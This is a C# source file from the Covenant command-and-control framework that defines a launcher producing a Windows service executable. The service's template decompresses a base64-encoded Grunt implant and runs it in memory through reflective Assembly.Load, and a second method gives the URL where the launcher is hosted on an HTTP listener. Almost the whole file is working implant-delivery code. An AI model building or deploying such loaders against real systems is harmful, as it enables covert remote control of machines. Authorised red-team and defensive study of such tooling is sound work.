// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using Covenant.Core;
using Covenant.Models.Grunts;
using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class ServiceBinaryLauncher : Launcher
    {
        public ServiceBinaryLauncher()
        {
            this.Type = LauncherType.ServiceBinary;
            this.Description = "Uses a generated .NET Framework Service binary to launch a Grunt.";
            this.OutputKind = OutputKind.ConsoleApplication;
            this.CompressStager = true;
        }

        public override string GetLauncherString(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            string stager = Convert.ToBase64String(StagerAssembly);
            
            string code = CodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", stager);
            
            var references = grunt.DotNetVersion == Common.DotNetVersion.Net35 ? Common.DefaultNet35References : Common.DefaultNet40References;
            references.Add(new Compiler.Reference
            {
                File = grunt.DotNetVersion == Common.DotNetVersion.Net35 ? Common.CovenantAssemblyReferenceNet35Directory + "System.ServiceProcess.dll" : Common.CovenantAssemblyReferenceNet40Directory + "System.ServiceProcess.dll",
                Framework = grunt.DotNetVersion,
                Enabled = true
            });

            this.Base64ILByteString = Convert.ToBase64String(Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
            {
                Language = template.Language,
                Source = code,
                TargetDotNetVersion = grunt.DotNetVersion,
                OutputKind = OutputKind.ConsoleApplication,
                References = references
            }));

            this.LauncherString = string.Format("{0}{1}.exe", template.Name, "SVC");
            return this.LauncherString;
        }

        public override string GetHostedLauncherString(Listener listener, HostedFile hostedFile)
        {
            var httpListener = listener as HttpListener;

            if (httpListener != null)
            {
                var location = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                this.LauncherString = hostedFile.Path.Split("\\").Last().Split("/").Last();
                return location.ToString();
            }
            return "";
        }

        private static readonly string CodeTemplate =
@"using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.ServiceProcess;
using System.Timers;

namespace Grunt
{
    static class Program
    {
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[] { new Service() };
            ServiceBase.Run(ServicesToRun);
        }
    }

    public partial class Service : ServiceBase
    {
        public Service()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            Timer timer = new Timer(10);
            timer.Elapsed += new ElapsedEventHandler(Go);
            timer.AutoReset = false;
            timer.Start();
        }

        private void Go(object source, ElapsedEventArgs e)
        {
            var oms = new MemoryStream();
            var ds = new DeflateStream(new MemoryStream(Convert.FromBase64String(""{{GRUNT_IL_BYTE_STRING}}"")), CompressionMode.Decompress);
            var by = new byte[1024];
            var r = ds.Read(by, 0, 1024);

            while (r > 0)
            {
                oms.Write(by, 0, r);
                r = ds.Read(by, 0, 1024);
            }

            new System.Threading.Thread(delegate()
            {
                Assembly.Load(oms.ToArray()).EntryPoint.Invoke(0, new object[] { new string[] { } });
            }).Start();   
        }
    }

    partial class Service
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }

            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            this.ServiceName = ""Service"";
        }
    }
}";
    }
}